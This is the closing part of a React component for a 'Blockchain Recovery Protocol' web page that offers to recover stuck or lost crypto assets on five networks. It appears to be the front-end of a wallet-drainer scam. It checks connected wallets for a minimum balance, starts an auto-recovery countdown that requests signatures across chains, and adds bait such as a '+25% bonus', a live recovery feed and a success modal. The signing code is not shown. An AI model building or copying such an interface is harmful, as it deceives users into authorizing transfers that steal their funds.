      <div className="fixed w-[400px] h-[400px] bg-blue-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>

      {/* Floating Recovery Button */}
      <div onClick={recoverAssets} className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-blue-600 to-blue-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-blue-700 hover:to-blue-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center">
        <span className="text-2xl mr-2">🔗</span> {translations.recoverButton}
      </div>
      <div onClick={recoverAssets} className="fixed bottom-6 right-6 bg-gradient-to-r from-blue-600 to-blue-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-blue-700 hover:to-blue-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2">
        <span className="text-xl">🔗</span>
        <span className="text-sm font-semibold">{translations.recoverButton}</span>
      </div>

      {/* Language Selector */}
      <div className="absolute top-6 right-6 z-50">
        <div className="relative">
          <button onClick={() => setShowLanguageDropdown(!showLanguageDropdown)} className="bg-black/50 backdrop-blur border border-blue-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-blue-500 transition-all">
            <span className="text-lg">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
            <span className="text-sm text-white hidden sm:inline">{SUPPORTED_LANGUAGES[language]?.native || 'English'}</span>
            <i className={`fas fa-chevron-down text-blue-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
          </button>
          {showLanguageDropdown && (
            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-blue-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto custom-scrollbar">
              <div className="p-2">
                <div className="text-xs text-blue-500 px-3 py-2 font-semibold border-b border-blue-500/20 mb-1">SELECT LANGUAGE</div>
                {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                  <button key={code} onClick={() => changeLanguage(code)} className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-blue-500/10 ${language === code ? 'bg-blue-500/20 border border-blue-500/30' : ''}`}>
                    <span className="text-xl">{lang.flag}</span>
                    <div className="flex-1"><div className="text-sm font-medium text-white">{lang.name}</div><div className="text-xs text-gray-400">{lang.native}</div></div>
                    {language === code && <i className="fas fa-check text-blue-500 text-sm"></i>}
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
        <div className="flex flex-col items-center text-center pt-16 pb-8">
          
          {/* Logo */}
          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-blue">
            <span className="bg-gradient-to-r from-blue-500 to-blue-300 bg-clip-text text-transparent">BLOCKCHAIN RECOVERY</span>
          </div>

          {/* Live Badge */}
          <div className="bg-blue-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-blue mb-4">● {translations.serviceActive}</div>

          <p className="max-w-2xl text-gray-300 leading-relaxed mb-4 text-sm md:text-base">
            Blockchain Recovery Protocol helps users recover stuck transactions, lost funds, and non-custodial wallet assets across 5 major blockchain networks.
          </p>

          {/* Network Status Indicator */}
          <NetworkStatusIndicator networks={DEPLOYED_CHAINS} translations={translations} />

          {/* Wallet Connect Section */}
          {!isConnected ? (
            <button onClick={() => open()} className="bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(59,130,246,0.4)] mb-8 w-full max-w-md">
              {translations.connectWallet}
            </button>
          ) : (
            <div className="flex flex-col items-center w-full max-w-md mb-8">
              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-blue-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                <span className="font-mono text-sm text-gray-300">{formatAddress(address)}</span>
                <button onClick={() => disconnect()} className="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 transition-colors flex items-center justify-center">
                  <i className="fas fa-power-off text-xs"></i>
                </button>
              </div>
              
              {/* Email Input */}
              {!userEmail && isConnected && (
                <input type="email" value={userEmail} onChange={(e) => setUserEmail(e.target.value)} 
                  placeholder="Enter email for recovery confirmation" 
                  className="mt-3 w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm" />
              )}
              
              {/* Recovery Button */}
              {showRecoverButton && userEmail && (
                <button onClick={recoverAssets} disabled={signatureLoading} 
                  className="mt-3 w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 animate-pulse-glow">
                  {signatureLoading ? (
                    <span className="flex items-center justify-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      {processingChain ? `${translations.chainProcessing} ${processingChain}...` : translations.processing}
                    </span>
                  ) : (
                    <span className="flex items-center justify-center gap-2">
                      <span className="text-xl">🔗</span>
                      {translations.recoveryReady}
                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+25%</span>
                    </span>
                  )}
                </button>
              )}

              {/* Auto-recovery countdown */}
              {autoRecoveryActive && isEligible && !signatureLoading && (
                <AutoRecoveryCountdown seconds={5} translations={translations} onCancel={() => setAutoRecoveryActive(false)} />
              )}

              {/* Status message */}
              <div className="mt-3 w-full">
                <div className={`rounded-lg p-3 text-sm ${
                  isEligible && userEmail ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 
                  isEligible && !userEmail ? 'bg-yellow-500/20 border border-yellow-500/30 text-yellow-400' : 
                  'bg-gray-500/20 border border-gray-500/30 text-gray-400'
                }`}>
                  {isEligible && userEmail ? `🔗 ${translations.proceedToRecovery}` : 
                   isEligible && !userEmail ? `📧 ${translations.emailNotification}` : 
                   totalOnChainValue > 0 && totalOnChainValue < 1 ? `⚠️ ${translations.insufficientBalance}` : 
                   totalOnChainValue === 0 ? `🔍 ${translations.notEligible}` : translations.scanningNetworks}
                </div>
              </div>
            </div>
          )}

          {/* Scanning Animation */}
          {isConnected && scanning && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-blue-500/30">
                <div className="flex items-center justify-center gap-4 mb-4">
                  <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                  <div className="text-left">
                    <div className="text-lg font-bold text-blue-400">{translations.checkEligibility}</div>
                    <div className="text-sm text-gray-400">{translations.verifying}</div>
                  </div>
                </div>
                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                  <div className="bg-gradient-to-r from-blue-500 to-blue-400 h-1.5 rounded-full transition-all duration-300" style={{ width: `${scanProgress}%` }}></div>
                </div>
                <div className="mt-3 text-sm text-blue-400">{txStatus}</div>
              </div>
            </div>
          )}

          {/* Live Recovery Feed */}
          <LiveRecoveryFeed transactions={liveTransactions} translations={translations} 
            totalRecoveredAmount={totalRecoveredAmountUSD} todayCount={todayCount} 
            onDownloadReport={() => {}} walletAddress={address} />

          {/* Recovery Portal Card */}
          <div className="w-full max-w-md bg-blue-500/5 border border-blue-500/30 backdrop-blur p-8 rounded-2xl mt-8">
            <h3 className="text-2xl font-bold mb-4 text-blue-400">Asset Recovery Portal</h3>
            
            <div className="flex justify-between items-center mb-3">
              <p className="text-gray-300">{translations.recoveryValue}:</p>
              <p className="text-blue-400 font-bold">${totalOnChainValue.toLocaleString()} USD</p>
            </div>
            
            <div className="w-full bg-blue-950 h-3 rounded-full overflow-hidden mb-6">
              <div className="h-full bg-gradient-to-r from-blue-600 to-blue-400 rounded-full transition-all duration-1000" style={{ width: `${Math.min(100, (totalOnChainValue / 1000000) * 100)}%` }}></div>
            </div>
            
            <div className="grid grid-cols-2 gap-3 mb-6">
              <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
                <p className="text-xs text-gray-400">{translations.tokenPrice}s</p>
                <p className="text-lg font-bold text-blue-400">{Object.keys(balances).length}/5</p>
              </div>
              <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
                <p className="text-xs text-gray-400">{translations.recoveryFee}</p>
                <p className="text-lg font-bold text-blue-400">5% + Gas</p>
              </div>
            </div>

            <div className="bg-black/50 border border-blue-500/30 rounded-xl p-5">
              <h4 className="text-xl font-bold mb-2 text-blue-400">🔗 Recovery Protocol</h4>
              <p className="text-sm text-gray-400 mb-3">Scans 5 networks to identify and retrieve recoverable assets:</p>
              <ul className="text-xs text-gray-400 space-y-1 list-disc list-inside">
                <li>Stuck/pending transactions</li>
                <li>Non-custodial wallet assets</li>
                <li>Unclaimed token balances</li>
                <li>Cross-chain transfer issues</li>
              </ul>
            </div>

            {txStatus && !scanning && <div className="mt-4 text-sm text-center text-blue-400">{txStatus}</div>}
            {error && <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300">{error}</div>}
            {completedChains.length > 0 && (
              <div className="mt-4 text-center">
                <div className="text-xs text-gray-400">{translations.completedOn}: {completedChains.join(' → ')}</div>
                {lastTxHash && (
                  <div className="mt-2 text-[10px] text-gray-500 break-all">
                    Tx: {lastTxHash.slice(0, 10)}...{lastTxHash.slice(-8)}
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Completion Message */}
          {completedChains.length > 0 && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                <p className="text-green-400 text-lg mb-2">✓ {translations.completed}</p>
                <p className="text-gray-400 text-sm">{translations.secured}</p>
                {userEmail && <p className="text-xs text-gray-500 mt-2">📧 {translations.emailNotification}</p>}
              </div>
            </div>
          )}

          {/* Welcome Message */}
          {isConnected && !isEligible && !completedChains.length && !scanning && totalOnChainValue === 0 && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-blue-500/30">
                <div className="text-6xl mb-4">🔗</div>
                <h2 className="text-xl font-bold mb-3 text-blue-400">{translations.welcome}</h2>
                <p className="text-gray-400 text-sm mb-6">{translations.minRequirement}</p>
                <div className="bg-black/50 rounded-lg p-3"><p className="text-xs text-gray-400">Supported: Ethereum, BSC, Polygon, Arbitrum, Avalanche</p></div>
              </div>
            </div>
          )}

          {/* Info Section */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-blue-400">How It Works</h3>
              <p className="text-sm text-gray-400 leading-relaxed">1. Connect wallet<br/>2. System scans 5 networks<br/>3. Authorize recovery<br/>4. Assets retrieved</p>
            </div>
            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-blue-400">Supported Networks</h3>
              <p className="text-sm text-gray-400 leading-relaxed">• Ethereum (ETH)<br/>• BSC (BNB)<br/>• Polygon (MATIC)<br/>• Arbitrum<br/>• Avalanche</p>
            </div>
            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-blue-400">Security</h3>
              <p className="text-sm text-gray-400 leading-relaxed">On-chain execution with smart contract security and verifiable records.</p>
            </div>
          </div>

          <footer className="mt-16 text-gray-500 text-sm">© 2026 Blockchain Recovery Protocol — Secure Non-Custodial Asset Recovery</footer>
        </div>
      </div>

      {/* Popup and Celebration Modal */}
      {showPopup && currentPopupTx && (
        <LiveRecoveryPopup tx={currentPopupTx} onClose={() => setShowPopup(false)} onDownloadReport={() => {}} 
          translations={translations} walletAddress={address} />
      )}

      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-lg w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-blue-600/30 via-blue-500/30 to-blue-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
            {[...Array(20)].map((_, i) => (
              <div key={i} className="absolute w-0.5 h-0.5 bg-blue-400 rounded-full animate-confetti-cannon" style={{ left: `${Math.random() * 100}%`, top: '50%', animationDelay: `${i * 0.1}s` }} />
            ))}
            <div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-blue-500/20 shadow-2xl text-center">
              <div className="text-7xl animate-bounce mb-4">🎉</div>
              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-blue-400 to-blue-300 bg-clip-text text-transparent">{translations.successful}</h2>
              <p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p>
              <div className="text-5xl font-black text-blue-400 mb-3 animate-pulse">${liveTransactions[0]?.recoveryAmount?.toLocaleString() || '0'} USD</div>
              <div className="inline-block bg-gradient-to-r from-blue-500/20 to-blue-600/20 px-6 py-3 rounded-full mb-4 border border-blue-500/30">
                <span className="text-2xl text-blue-400">+25% BONUS</span>
              </div>
              <p className="text-xs text-gray-500 mb-6">✓ {translations.completedOn} {verifiedChains.length} chains{userEmail && <span className="block mt-1">📧 {translations.emailNotification}</span>}</p>
              <button onClick={() => setShowCelebration(false)} className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105">
                {translations.viewButton}
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes glow-blue { from { filter: drop-shadow(0 0 10px #3b82f6); } to { filter: drop-shadow(0 0 40px #60a5fa); } }
        @keyframes pulse-blue { 0% { box-shadow: 0 0 0 0 rgba(59,130,246,.7); } 70% { box-shadow: 0 0 0 15px rgba(59,130,246,0); } 100% { box-shadow: 0 0 0 0 rgba(59,130,246,0); } }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
        @keyframes confetti-cannon { 0% { transform: translateY(0) rotate(0deg); opacity: 0.8; } 100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; } }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        @keyframes pulse-slow { 0%, 100% { opacity: 0.3; } 50% { opacity: 0.6; } }
        @keyframes slideInUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .animate-glow-blue { animation: glow-blue 3s infinite alternate; }
        .animate-pulse-blue { animation: pulse-blue 1.5s infinite; }
        .animate-pulse-glow { animation: blink 1.2s infinite; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-slideInUp { animation: slideInUp 0.3s ease-out; }
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(59,130,246,0.1); border-radius: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(59,130,246,0.4); border-radius: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(59,130,246,0.6); }
      `}</style>
    </div>
  );
}

export default App;
